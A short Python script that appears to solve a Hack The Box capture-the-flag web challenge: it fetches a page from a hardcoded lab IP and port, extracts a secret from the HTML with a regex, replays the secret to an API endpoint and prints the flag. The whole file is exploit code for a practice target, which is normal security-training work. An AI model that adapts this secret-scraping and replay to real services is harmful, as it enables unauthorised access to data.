import requests
import re

host, port = "94.237.63.68", 41980

url = f"http://{host}:{port}/"
api_url = f"{url}/api/list/all"

session = requests.Session()

response = session.get(url)

data_secret = re.search(r"value='(.*)'>", response.text)
secret = data_secret.group(1)

def grab_flag(api_url, secret):
    response_api = session.get(api_url, params={'secret': secret})
    flag = re.search(r'HTB\{.*?\}', response_api.text)
    print(flag.group())


grab_flag(api_url, secret)